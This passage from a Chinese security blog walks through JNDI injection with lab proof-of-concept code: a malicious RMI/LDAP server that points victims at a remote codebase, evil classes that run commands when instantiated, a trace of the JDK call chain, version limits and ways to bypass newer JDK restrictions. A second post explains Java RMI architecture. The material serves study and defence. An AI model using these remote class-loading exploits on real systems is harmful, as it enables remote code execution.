class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LdapClient.java，LDAP客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"ldap://localhost:1234/EvilObject2"</span>);</span><br><span class="line">            String data = <span class="string">"This is LDAP Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EvilObject.java，恶意类，执行弹出计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject2</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200703190435334.png" alt="image-20200703190435334"></p>
<h1 id="JNDI利用链分析"><a href="#JNDI利用链分析" class="headerlink" title="JNDI利用链分析"></a>JNDI利用链分析</h1><p>这里写一个小PoC，跟进去看看利用链。</p>
<p>客户端，受害者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端，攻击者部署：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意类，干坏事的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">"pwd"</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击截图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704132057164.png" alt="image-20200704132057164"></p>
<blockquote>
<p>把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。<br>ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。<br>java版本小于1.8u191。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。</p>
</blockquote>
<h2 id="分析调用流程"><a href="#分析调用流程" class="headerlink" title="分析调用流程"></a>分析调用流程</h2><p>整体调用链如下：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/006iKNp3ly1g8979n598cj30vr08nq3k.jpg" alt="img"></p>
<p>第一个函数，InitialContext.lookup函数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="comment">//getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象</span></span><br><span class="line">        <span class="comment">//然后在对应协议中去lookup搜索，我们进入lookup函数</span></span><br><span class="line">        <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>第二个，GenericURLContext.lookup函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//var1="rmi://127.0.0.1:1099/aa"</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704145837036.png" alt="image-20200704145837036"></p>
<img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704150316167.png" alt="image-20200704150316167" style="zoom:200%;">

<p>这里再提一下getRootURLContext函数，可以看到他对不同的JNDI协议配置了不同的解析函数（查看实现：option+command+B）。</p>
<p>第三个函数，RegistryContext.lookup：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入var1=aa</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//判断来到这里</span></span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));<span class="comment">//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));<span class="comment">//我们进入此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第四个函数，decodeObject：</p>
<p>先说一下怎么进入，直接下断点，直接执行到cursor，这里需要等待一会，然后直接进入看源码：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704160754859.png" alt="image-20200704160754859"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动</span></span><br><span class="line">            <span class="comment">//如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。</span></span><br><span class="line">            <span class="comment">//如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            <span class="comment">//获取reference对象进入此处</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704155703140.png" alt="image-20200704155703140"></p>
<p>进入到这个函数之后继续跑：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704163003687.png" alt="image-20200704163003687"></p>
<p>第五个函数，继续跟进去，NamingManager：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入Reference对象,也就是var3到refinfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                        Hashtable&lt;?,?&gt; environment)</span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    Reference ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;<span class="comment">//满足</span></span><br><span class="line">        ref = (Reference) refInfo;<span class="comment">//复制</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;<span class="comment">//不进入</span></span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//进入此处</span></span><br><span class="line">        String f = ref.getFactoryClassName();<span class="comment">//函数名 ExecTest</span></span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//任意命令执行点1（构造函数、静态代码），进入此处</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//任意命令执行点2（覆写getObjectInstance），</span></span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                    environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704164056444.png" alt="image-20200704164056444"></p>
<p>第六个函数，getObjectFactoryFromReference：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//尝试从本地获取该class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果不在本地classpath，从cosebase中获取class</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:8081/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//从我们放置恶意class文件的web服务器中获取class文件</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例化我们的恶意class文件</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704164249814.png" alt="image-20200704164249814"></p>
<p>实例化会默认调用构造方法、静态代码块。<br>上面的例子就是调用了构造方法完成任意代码执行。</p>
<p>但是可以注意到之前执行任意命令成功，但是报错退出了，我们修改我们的恶意class文件，换一个命令执行点<code>factory.getObjectInstance</code>复写该函数执行命令。</p>
<ol>
<li><p>报错是因为我们的类在实例化后不能转化为ObjectFactory<code>(ObjectFactory) clas.newInstance()</code>。只需要我们的类继承该类即可。</p>
</li>
<li><p>根据ObjectFactory.java的getObjectInstance接口复写函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Object getObjectInstance(Object obj, Name name, Context nameCtx,</span><br><span class="line">                             Hashtable&lt;?,?&gt; environment)</span><br><span class="line"> throws Exception;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h1><p>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。</p>
<p>所以不受RMI动态加载恶意类的 <strong>java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性</strong>的限制。具有更多的利用空间</p>
<p>但还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。（这也是1.8u191失败的原因）</p>
<p>之前也提到jndi注入远程对象读取不单单只可以从rmi服务中读取，还可以从LDAP服务中读取</p>
<p>LDAP服务的Reference远程加载Factory类<strong>不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制</strong>，所以适用范围更广。</p>
<p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，<br>在Oracle JDK 11.0.1、8u191、7u201、6u211之后 <strong>com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false</strong>。</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg" alt="img"></p>
<h1 id="绕过JDK-8u191-等高版本限制"><a href="#绕过JDK-8u191-等高版本限制" class="headerlink" title="绕过JDK 8u191+等高版本限制"></a>绕过JDK 8u191+等高版本限制</h1><p>对于<code>Oracle JDK 11.0.1、8u191、7u201、6u211</code>或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，依然可以进行绕过并完成利用。两种绕过方法如下：</p>
<ol>
<li>找到一个受害者本地<code>CLASSPATH</code>中的类作为恶意的<code>Reference Factory</code>工厂类，并利用这个本地的<code>Factory</code>类执行命令。</li>
<li>利用<code>LDAP</code>直接返回一个恶意的序列化对象，<code>JNDI</code>注入依然会对该对象进行反序列化操作，利用反序列化<code>Gadget</code>完成命令执行。</li>
</ol>
<p>这两种方式都非常依赖受害者本地<code>CLASSPATH</code>中环境，需要利用受害者本地的<code>Gadget</code>进行攻击，当然之后会新起一篇再说。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上就是总结JNDI的利用组合，其实个人觉得JNDI，RMI，LDAP都很像。</p>
<p><a href="[https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/](https://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/)">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java RMI原理及实战</title>
    <url>/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>遥知兄弟登高处，遍插茱萸少一人。</p>
</blockquote>
<p>前一阵总结反序列化漏洞，发现RMI作为跳板，该角色必不可少。</p>
<a id="more"></a>

<h1 id="RMI概念简述"><a href="#RMI概念简述" class="headerlink" title="RMI概念简述"></a>RMI概念简述</h1><p>RMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如CORBA、WebService，这两种都是独立于各个编程语言的。</p>
<p>而Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，因此它支持从一个JVM到另一个JVM的调用。</p>
<p>在Java RMI中，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法，其中对象是通过序列化方式进行编码传输的。所以平时说的反序列化漏洞的利用经常是涉及到RMI，就是这个意思。</p>
<p>RMI依赖的通信协议为JRMP（Java Remote Message Protocol，Java远程消息交换协议），该协议是为Java定制的，要求服务端与客户端都必须是Java编写的。</p>
<p>以下是wiki的描述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</span><br><span class="line"></span><br><span class="line">Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。</span><br></pre></td></tr></table></figure>

<p>根据wiki所说RMI全称为Remote Method Invocation，也就是远程方法调用，通俗点解释，就是跨越jvm，调用一个远程方法。众所周知，一般情况下java方法调用<br>指的是同一个jvm内方法的调用，而RMI与之恰恰相反。</p>
<p>例如我们使用浏览器对一个http协议实现的接口进行调用，这个接口调用过程我们可以称之为Interface Invocation，而RMI的概念与之非常相似，只不过RMI调用的是一个Java方法，而浏览器调用的是一个http接口，并且Java中封装了RMI的一系列定义。</p>
<p>到这里，做个简短通俗的总结：RMI是一种行为，这种行为指的是Java远程方法调用。</p>
<p><code>RMI</code>是远程方法调用的简称，能够帮助我们查找并执行远程对象的方法。通俗地说，远程调用就像把一个<code>class</code>放在A机器上，然后在B机器中调用这个<code>class</code>的方法。</p>
<ul>
<li><code>RMI</code>（<code>Remote Method Invocation</code>），为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</li>
<li><code>Java RMI</code>（<code>Java Remote Method Invocation</code>），是Java编程语言里一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</li>
</ul>
<p>从客户端-服务器模型来看，客户端程序直接调用服务端，两者之间是通过<code>JRMP</code>（ <a href="https://en.wikipedia.org/wiki/Java_Remote_Method_Protocol" target="_blank" rel="noopener">Java Remote Method Protocol</a>）协议通信，这个协议类似于HTTP协议，规定了客户端和服务端通信要满足的规范。</p>
<h1 id="RMI代理模式"><a href="#RMI代理模式" class="headerlink" title="RMI代理模式"></a>RMI代理模式</h1><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>RMI的设计模式中，主要包括以下三个部分的角色：</p>
<ul>
<li>Registry：提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li>
<li>Server：远程方法的提供者，并向Registry注册自身提供的服务</li>
<li>Client：远程方法的消费者，从Registry获取远程方法的相关信息并且调用</li>
</ul>
<h2 id="交互过程"><a href="#交互过程" class="headerlink" title="交互过程"></a>交互过程</h2><p>RMI交互过程如图所示：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625140935583.png" alt="image-20200625140935583"></p>
<p>RMI由3个部分构成，第一个是RMI Registry（JDK提供的一个可以独立运行的程序，在bin目录下），第二个是Server端的程序，对外提供远程对象，第三个是Client端的程序，想要调用远程对象的方法。</p>
<p>在设计模式中，3个角色的交互过程可简单概述为：</p>
<ol>
<li>服务端创建远程对象，<code>Skeleton</code>侦听一个随机的端口，以供客户端调用。</li>
<li>启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。</li>
<li>Server端在本地先实例化一个提供服务的<u>实现类</u>，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称；</li>
<li>客户端对<code>RMI Registry</code>发起请求，根据提供的<code>Name</code>得到<code>Stub</code>。<code>Stub</code>中包含与<code>Skeleton</code>通信的信息（地址，端口等），两者建立通信，<code>Stub</code>作为客户端代理请求服务端代理<code>Skeleton</code>并进行远程方法调用。</li>
<li>客户端<code>Stub</code>调用远程方法，调用结果先返回给<code>Skeleton</code>，<code>Skeleton</code>再返回给客户端<code>Stub</code>，<code>Stub</code>再返回给客户端本身。</li>
</ol>
<p>此外，我们可以看到，从逻辑上来看数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。</p>
<h2 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h2><p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625141235915.png" alt="image-20200625141235915"></p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625144347103.png" alt="image-20200625144347103"></p>
<p>方法调用从客户端经存根（stub）、远程引用层（Remote Reference Layer）和传输层（Transport Layer）向下，传递给主机，然后再次经传输层，向上穿过远程调用层和骨干网（Skeleton），到达服务器对象。</p>
<p>存根stub位于客户端，扮演着远程服务器对象的代理，使该对象可被客户激活。远程引用层处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。</p>
<p>传输层管理实际的连接，并且追踪可以接受方法调用的远程对象。骨干网完成对服务器对象实际的方法调用，并获取返回值。返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根stub获得返回值。</p>
<p>总结：</p>
<p>Stub存根：扮演着远程服务器对象的代理的角色，使该对象可被客户激活。</p>
<p>远程引用层：处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。</p>
<p>传输层：管理实际的连接，并且追踪可以接受方法调用的远程对象。</p>
<p>Skeleton骨干网：完成对服务器对象实际的方法调用，并获取返回值。</p>
<p>返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根获得返回值。</p>
<h2 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h2><p>RMI的客户端和服务器并不直接通信，客户与远程对象之间采用的代理方式进行<code>Socket</code>通信。为远程对象分别生成了客户端代理和服务端代理，其中位于客户端的代理类称为Stub即存根（包含服务器<code>Skeleton</code>信息），位于服务端的代理类称为<code>Skeleton</code>即骨干网。</p>
<h2 id="RMI-Registry"><a href="#RMI-Registry" class="headerlink" title="RMI Registry"></a>RMI Registry</h2><p><code>RMI注册表</code>，默认监听在<code>1099</code>端口上，<code>Client</code>通过<code>Name</code>向<code>RMI Registry</code>查询，得到这个绑定关系和对应的<code>Stub</code>。</p>
<blockquote>
<p>Stub的获取方式有很多，常见的方法就是调用某个远程服务上的方法，向远程服务获取存根。</p>
<p>但是调用远程方法必须需要先有远程对象的Stub，所以这里面就有一个逻辑死锁。所以JDK提供了一个RMI注册表也就是<code>RMI Registry</code>来解决这个问题。</p>
</blockquote>
